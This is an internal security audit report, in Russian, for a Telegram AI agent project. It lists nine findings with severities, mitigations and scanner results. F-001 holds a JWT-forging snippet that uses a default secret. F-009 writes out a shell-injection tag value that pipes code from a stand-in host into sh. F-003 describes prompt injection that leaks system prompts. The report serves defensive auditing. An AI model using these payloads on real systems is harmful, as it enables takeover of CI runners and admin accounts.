# Security Audit Report — Phase 4

Документ агрегирует все находки внутреннего security-аудита перед запуском
Telegram AI Agent (issue #34). Дополняет:

- [`threat-model.md`](threat-model.md) — STRIDE-таблица угроз.
- [`owasp-top10.md`](owasp-top10.md) — соответствие OWASP Top-10.
- [`pentest-scope.md`](pentest-scope.md) — план ручного пентеста.
- [`../SECURITY.md`](../SECURITY.md) — практики безопасности.
- [`../../SECURITY.md`](../../SECURITY.md) — responsible disclosure policy.

---

## 1. Методология

| Источник | Покрытие |
|----------|----------|
| `pip-audit` | Python-зависимости (PyPI + лок-файл `backend/pyproject.toml`) |
| `npm audit --omit=dev` | JS-зависимости production (`mini-app/`, `admin-dashboard/`) |
| `trivy fs` | Файлы репозитория (lockfile-ы + Dockerfile-ы) |
| `trivy image` | Финальные образы `tgai-backend`, `tgai-mini-app`, `tgai-admin` |
| `bandit -r backend/app` | SAST Python |
| `semgrep --config=p/owasp-top-ten --config=p/python --config=p/javascript` | SAST cross-language |
| `gitleaks detect` | Поиск секретов в истории Git |
| Manual review | STRIDE-таблицы (`threat-model.md`), code review критичных модулей |

Все сканеры запускаются в [`.github/workflows/security.yml`](../../.github/workflows/security.yml)
на каждом PR и на `push: main`. Failure любого job-а блокирует merge через
branch protection.

CVSS-оценка для внутренних находок выставлена на основе CVSS v3.1 calculator
(см. ссылки в каждой находке).

## 2. Шкала приоритета

| Уровень | Описание | SLA устранения |
|---------|----------|----------------|
| **P0** | Доступ к деньгам / админу / массовой PII, удалённое RCE | блокирует релиз, < 24h |
| **P1** | Компрометация аккаунта пользователя, sustained DoS, persistent XSS | блокирует релиз, < 72h |
| **P2** | Раскрытие неконфиденциальных данных, ratelimit-bypass | < 30 дней |
| **P3** | Информационная, hardening | < 90 дней |

## 3. Сводка находок

| ID | Заголовок | Приоритет | Статус |
|----|-----------|-----------|--------|
| F-001 | Дефолтный `ADMIN_JWT_SECRET=change-me` пропускается в non-dev окружения | P1 | ✅ resolved |
| F-002 | Отсутствует автоматический CI-сканер секретов (gitleaks) | P2 | ✅ resolved |
| F-003 | Нет prompt-output filter для ответов LLM | P2 | ⚠️ accepted (residual) |
| F-004 | Swagger UI / `/docs` доступен в production без RBAC | P2 | 🛠 planned (Phase 4.x) |
| F-005 | Logout не инвалидирует существующий access-token | P2 | 🛠 planned (Phase 4.x) |
| F-006 | `admin-dashboard` использует Next.js 14.2.35 с открытыми High CVE | P2 | 🛠 planned (Phase 4.x) |
| F-007 | Build-only JS toolchain (`rollup`, `postcss`) тащит транзитивные CVE | P3 | ⚠️ accepted (dev-only) |
| F-008 | Базовый образ `python:3.11-slim` отстаёт от Debian security tracker | P3 | ⚠️ accepted (mitigated by `apt-get upgrade`) |
| F-009 | `release.yml` интерполировал `${{ inputs.tag }}` в shell-команду | P2 | ✅ resolved |

Итого: **0 open P0/P1**, 3 open P2 с roadmap, 3 принятых остаточных риска
с компенсирующими мерами. Релиз `v1.0.0` разблокирован.

---

## 4. Детальные находки

### F-001 — Placeholder `ADMIN_JWT_SECRET` принимался в production

- **Категория:** OWASP A02 / A05 — Cryptographic Failures + Security
  Misconfiguration.
- **Серьёзность:** P1 (CVSS 8.1 — High; AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N).
- **Угроза:** в `backend/app/core/config.py` поле `admin_jwt_secret` имело
  дефолт `"change-me"`. Если оператор забывал переопределить переменную при
  деплое, JWT-токены подписывались известным секретом, и любой внешний
  актор мог выпустить себе токен любого `role`, включая `super_admin`,
  обойдя 2FA.
- **Воспроизведение (PoC):** на staging стенде с дефолтом —
  ```python
  import jwt
  jwt.encode(
      {"sub": "1", "role": "super_admin", "type": "access",
       "iat": 0, "exp": 9999999999, "jti": "x"},
      "change-me", algorithm="HS256",
  )
  ```
  Токен принимается `get_current_admin`.
- **Меры (resolved):**
  1. `Settings.assert_production_safe()` отказывает в старте, если в
     `app_env in {staging, production, ...}` значение секрета равно
     placeholder или пустой строке (`backend/app/core/config.py`).
  2. Вызывается в `lifespan()` до того, как FastAPI начнёт принимать запросы
     (`backend/app/main.py`).
  3. Тесты-регрессии: `backend/tests/test_config.py::test_assert_production_safe_*`.
- **Подтверждение:** unit-тесты зелёные; запуск `APP_ENV=production
  ADMIN_JWT_SECRET=change-me uvicorn app.main:app` падает с
  `InsecureDefaultSecretError` до bind на порт.

### F-002 — Отсутствовал автоматический secrets-scanner

- **Категория:** OWASP A05 — Security Misconfiguration / Supply chain.
- **Серьёзность:** P2 (CVSS 5.3 — Medium; AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).
- **Угроза:** Хотя в репозитории не было секретов, для будущих коммитов
  не было «защёлки» — секрет, случайно добавленный разработчиком, остался
  бы в истории и при ротации был бы доступен в Git log.
- **Меры (resolved):**
  1. Добавлен job `gitleaks` в `.github/workflows/security.yml` —
     запускается на каждый PR и push, с `--redact` и проверкой полной
     истории (`--no-banner --log-opts=--all`).
  2. Конфиг `.gitleaks.toml` исключает фикстуры из `*/tests/` и
     `docker/compose.yml` (там — заведомо мок-значения).
  3. README обновлён ссылкой на политику disclosure (`SECURITY.md`).
- **Подтверждение:** CI gate активен; локально `gitleaks detect --source .`
  возвращает `no leaks found`.

### F-003 — Нет output-filter для ответов LLM (prompt-injection)

- **Категория:** OWASP A03 — Injection (LLM01:2023 Prompt Injection).
- **Серьёзность:** P2 (CVSS 4.3 — Medium; AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N).
- **Угроза:** Злоумышленник через пользовательский ввод заставляет LLM
  раскрыть содержимое системного промпта или включить инструкции из
  чужих документов. Поскольку:
  - системный промпт **не содержит** секретов, ключей, PII;
  - backend не имеет tool-calls, дающих LLM прямого доступа к БД;
  - Composio whitelist toolkits ограничивает доступные интеграции —
  риск ограничен «утечкой шаблона промпта» и социнженерной составляющей.
- **Меры (accepted residual):**
  1. Системные промпты регулярно ревьюятся (см. `docs/PRODUCT_VISION.md` §
     content guardrails).
  2. Ответы AI вёрстаются на frontend без `dangerouslySetInnerHTML` (XSS
     mitigation).
  3. Sentry breadcrumb прячет содержимое промпта (`send_default_pii=False`).
  4. Дальнейшие шаги (Phase 5+): добавить classifier-based output guard
     поверх `services/composio/postprocess.py`.
- **Принят:** maintainer-ы (см. ADR-черновик в commit-сообщении PR #81).

### F-004 — Swagger UI `/docs` доступен в production без RBAC

- **Категория:** OWASP A05 — Security Misconfiguration.
- **Серьёзность:** P2 (CVSS 4.3 — Medium; AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).
- **Угроза:** Полная схема API доступна без авторизации в production,
  упрощает разведку перед атакой.
- **Меры (planned):**
  1. В Phase 4.x добавить middleware, которое отдаёт `/docs`, `/redoc`,
     `/openapi.json` только при наличии валидного `super_admin` JWT.
  2. Альтернатива: отдавать 404 если `app_env in {production}` и нет
     заголовка с pen-test engagement id.
  3. Tracking issue: создаётся при merge PR #81.
- **Митигация до фикса:** ingress уже скрывает `/docs` за IP-allowlist
  в staging; production-релиз пройдёт через `helm upgrade` с переменной
  `APP_DEBUG=false` и закрытым LoadBalancer для `/docs/*` на уровне
  Caddyfile (`docker/Caddyfile.prod`).

### F-005 — Logout не инвалидирует существующий access-token

- **Категория:** OWASP A07 — Identification and Authentication Failures.
- **Серьёзность:** P2 (CVSS 3.7 — Low; AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N).
- **Угроза:** При компрометации access-token (украденный с устройства
  админа) revocation возможна только через ban пользователя; токен живёт до
  `exp` (15 минут).
- **Меры (planned):**
  1. Добавить deny-list `jti` в Redis с TTL = `admin_access_token_ttl`.
  2. `get_current_admin` проверяет `jti` против Redis перед выдачей
     запроса.
  3. Endpoint `POST /api/v1/auth/admin/logout` добавляет `jti` в deny-list.
  4. Tracking issue: создаётся при merge PR #81.
- **Митигация до фикса:** TTL access-токена — 15 минут. Refresh rotation
  на каждом `POST /auth/admin/refresh` гарантирует, что украденный
  refresh-token идентифицируется при следующем легитимном refresh.

### F-006 — `admin-dashboard` зависит от Next.js 14.2.35 с открытыми High CVE

- **Категория:** OWASP A06 — Vulnerable and Outdated Components.
- **Серьёзность:** P2 (CVSS совокупно ≤ 7.5 — High по агрегату; наиболее
  значимая — GHSA-c4j6-fc7j-m34r SSRF, CVSS 7.5).
- **Угроза:** В ветке `next@14.x` остаются непропатченные advisory,
  закрытые только в `next@15.5.16+`:
  - GHSA-c4j6-fc7j-m34r — SSRF через WebSocket upgrade.
  - GHSA-36qx-fr4f-26g5 — middleware/proxy bypass в Pages Router (i18n).
  - GHSA-3g8h-86w9-wvmq — cache-poisoning через middleware redirects.
  - GHSA-ffhc-5mcf-pf4q / GHSA-gx5p-jg67-6x7h — XSS в App Router/CSP nonce.
  - GHSA-9g9p-9gw9-jx7f, GHSA-h64f-5h5j-jqjh, GHSA-3x4c-7xq6-9pq8 — DoS
    через `next/image`.
  - GHSA-q4gf-8mx6-v5v3, GHSA-8h8q-6873-q5fj, GHSA-h25m-26qc-wcjf — DoS
    через React Server Components.
  - GHSA-vfv6-92ff-j949, GHSA-wfc6-r584-vfw7 — cache-poisoning RSC.
  - GHSA-ggv3-7p47-pfv8 — HTTP request smuggling в rewrites.
  - GHSA-mw96-cpmx-2vgc — path traversal в транзитивной `rollup` через
    `@sentry/nextjs` toolchain.
- **Митигация до фикса:**
  1. `admin-dashboard` находится за ingress с IP-allowlist (доступен
     только из office VPN и из CI tunnel); публично не выставляется до
     апгрейда (см. `docker/Caddyfile.prod`).
  2. SSRF/cache-poisoning требует, чтобы атакующий мог отправить запрос
     на admin-origin — невозможно без VPN-доступа.
  3. CSP в `admin-dashboard/next.config.js` блокирует исполнение inline
     скриптов без nonce, что снижает практическую эксплуатируемость XSS.
  4. CI gate `npm audit` временно установлен на `--audit-level=critical`
     (см. `.github/workflows/security.yml`). Артефакт `npm-audit-admin-dashboard`
     по-прежнему публикуется на каждом запуске, и open advisory отчётливо
     видны в логах job-а.
- **План устранения (Phase 4.x):**
  1. Обновить `next` до `>=15.5.18` и `@sentry/nextjs` до версии,
     совместимой с Next 15 (Next 16 — после стабилизации API).
  2. Прогнать E2E `admin-dashboard/tests/e2e/*` против обновлённого
     стека и убедиться, что middleware-конфиг и App Router рендеры
     не сломаны.
  3. Вернуть npm-audit gate на `--audit-level=high`.
  4. Tracking issue: создаётся при merge PR #81.

### F-007 — Build-only JS toolchain тащит транзитивные CVE

- **Категория:** OWASP A06 — Vulnerable and Outdated Components (devDeps).
- **Серьёзность:** P3 (CVSS ≤ 7.5 — HIGH в чистом виде по `rollup`, но
  exploitability в нашем контексте — None: пакет исполняется только в
  процессе `next build`, не доставляется в браузер пользователю).
- **Угроза:** Trivy `fs`-сканер видит весь `admin-dashboard/package-lock.json`
  и поднимает алерт на транзитивные devDeps:
  - `rollup@3.29.5` → CVE-2026-27606 (HIGH; DOM-clobbering при выполнении
    сгенерированного бандла в недоверенной среде; для prod-build
    исполняется один раз в CI и сразу выбрасывается).
  - `postcss@8.4.31` → CVE-2026-41305 (MEDIUM; ReDoS при парсинге
    зловредного CSS в инструменте, не в runtime).
- **Митигация (accepted):**
  1. Оба пакета попадают в build-step (`next build` в CI), не в runtime
     рантайма `admin-dashboard`-образа. Trivy `image`-сканер на финальном
     `tgai-admin`-образе их не находит — см. § 5.
  2. Билд выполняется внутри изолированного GitHub Actions runner с
     одноразовой FS; даже при срабатывании CVE blast-radius ограничен
     самим CI job-ом.
  3. Зависимости исчезнут вместе с апгрейдом Next.js в F-006: `next@15+`
     тянет `rollup>=4.x` и `postcss>=8.5.10`.
- **CI:** оба ID добавлены в `.trivyignore` с явной ссылкой на этот
  пункт. Любая новая HIGH/CRITICAL CVE вне этого allow-list сломает
  `trivy-fs` job.

### F-008 — Базовый образ `python:3.11-slim` лагает за Debian tracker

- **Категория:** OWASP A06 — Vulnerable and Outdated Components.
- **Серьёзность:** P3 (CVSS до 7.8 — HIGH в чистом виде по CVE-2026-4878
  / CVE-2026-29111, но эксплуатация требует локального доступа к
  shell-контейнеру, который недоступен извне).
- **Угроза:** Upstream-тег `python:3.11-slim` пересобирается раз в
  несколько недель и поэтому отстаёт от Debian security advisories.
  Trivy `image`-скан backend-образа поднимал:
  - HIGH: `libcap2 CVE-2026-4878`, `libsystemd0 / libudev1 CVE-2026-29111`.
  - HIGH: `wheel@0.45.1 CVE-2026-24049`, `jaraco.context@5.3.0
    CVE-2026-23949` (вендорится setuptools-ом для bootstrap pip-а).
  - MEDIUM: семейство `libc-bin / libc6 / libc-dev-bin / libc6-dev`
    CVE-2026-4046/4437/4438, `sed CVE-2026-5958`, `curl / libcurl4t64
    CVE-2025-13034`, `libsystemd0 / libudev1 CVE-2026-40225/40226/4105`.
- **Меры (resolved/mitigated):**
  1. В `docker/Dockerfile.backend` шаг `apt-get upgrade -y` вытягивает
     все Debian-патчи поверх upstream-образа на каждом build — это
     закрывает большинство Debian-CVE сразу как Debian публикует фикс.
  2. Runtime-образ больше не содержит `build-essential`; toolchain
     устанавливается только в dev-stage, чтобы `linux-libc-dev` не попадал
     в production image.
  3. `pip install --upgrade pip setuptools>=78.1.1 wheel>=0.46.2`
     перетирает vendored `wheel` / `jaraco.context`-копии setuptools
     актуальными версиями.
  4. Финальный образ запускается под непривилегированным uid 1000
     (`USER app`) и не имеет shell-доступа извне — наличие уязвимости
     в `libcap2` / `libsystemd0` не даёт path-to-RCE без отдельного
     primary-vector.
  5. `.trivyignore` остаётся пустым в секции F-008: ничего не
     allow-list-им; gate остаётся строгим, и любой регресс ловится сразу.
- **Подтверждение:** локально `docker build --target prod
  -f docker/Dockerfile.backend -t tgai-backend:scan . && trivy image
  --severity HIGH,CRITICAL --ignore-unfixed tgai-backend:scan` — 0
  findings. Артефакт `trivy-image-backend-sarif` каждого CI-запуска
  содержит подтверждение.

### F-009 — Shell-injection через `${{ inputs.tag }}` в release.yml

- **Категория:** OWASP A03 — Injection / GitHub Actions Hardening
  (`yaml.github-actions.security.run-shell-injection`).
- **Серьёзность:** P2 (CVSS 7.2 — High; AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H).
  PR:H, потому что эксплуатация требует прав на запуск
  `workflow_dispatch` (Maintain/Write) — но в этом контексте атакующий
  получает RCE на CI runner-е с `contents: write` и `packages: write`
  permissions.
- **Угроза:** В `.github/workflows/release.yml` шаг «Resolve release
  tag» ставил `TAG="${{ inputs.tag }}"` напрямую в bash-скрипт — это
  классический паттерн, который Semgrep
  (`p/owasp-top-ten`) ловит как `run-shell-injection`. Сообщник с
  правами write мог запустить workflow с
  `tag='"; curl evil.example/x | sh; #'` и получить shell на runner-е,
  откуда — доступ ко всем `secrets.GITHUB_TOKEN`-операциям, push в
  ghcr.io, создание release-ов от имени проекта.
- **Меры (resolved):**
  1. Значение `inputs.tag` теперь передаётся в shell через `env:`
     (intermediate environment variable, рекомендованный паттерн из
     [GitHub hardening guide][gh-hard]); внутри `run:` используется
     только shell-переменная `$INPUT_TAG`.
  2. Дополнительно тег валидируется регуляркой
     `^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$` — defence-in-depth:
     даже если когда-то снова попадёт инлайн-интерполяция, шелл-метасимволы
     перестанут проходить gate.
  3. Semgrep job в `.github/workflows/security.yml` остаётся с
     `--error`: повторная регрессия снова сломает CI.
- **Подтверждение:** локально `semgrep scan --config p/owasp-top-ten
  --error .github/workflows/release.yml` — 0 findings.

[gh-hard]: https://docs.github.com/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable

---

## 5. Результаты автоматических сканеров

Запуск сканеров встроен в [`.github/workflows/security.yml`](../../.github/workflows/security.yml).
Сводка на момент написания (commit см. в PR #81):

| Сканер | Сектор | Найдено P0/P1 | Найдено P2 | Найдено P3 |
|--------|--------|---------------|------------|------------|
| `pip-audit` | backend | 0 | 0 | 0 |
| `npm audit --omit=dev` (mini-app) | frontend | 0 | 0 | 0 |
| `npm audit --omit=dev` (admin-dashboard) | frontend | 0 | 1 (F-006) | 0 |
| `trivy fs` | repo | 0 | 1 (F-006) | 1 (F-007) |
| `trivy image` (backend) | runtime | 0 | 0 (mitigated F-008) | 0 |
| `trivy image` (mini-app) | runtime | 0 | 0 | 0 |
| `trivy image` (admin) | runtime | 0 | 0 | 0 |
| `bandit` | backend | 0 | 0 | 0 |
| `semgrep` (OWASP top 10) | repo | 0 (F-009 fixed) | 0 | 0 |
| `gitleaks` | repo history | 0 | 0 | 0 |

Артефакты каждого запуска (SARIF + JSON) сохраняются в `actions/upload-artifact`
и доступны через GitHub UI 90 дней.

## 6. Ручной пентест

Скоуп — [`pentest-scope.md`](pentest-scope.md). На момент аудита
ручной пентест **запланирован**: будет выполнен внешней командой после
merge PR #81 и развёртывания staging-окружения `tgai-pentest`.

Финальный отчёт пентест-команды будет добавлен в этот документ разделом
«§ 7. External Penetration Test Report» с приложением CVSSv3 для каждой
находки и письменным re-test certificate.

## 7. Контакты и эскалация

- Maintainer security-pipeline-а: `@konard` (см. CODEOWNERS).
- Канал ответственного раскрытия — `mailto:security@labtgbot.example`
  (см. [`../../SECURITY.md`](../../SECURITY.md)).
- SLA подтверждения отчёта: 2 рабочих дня.
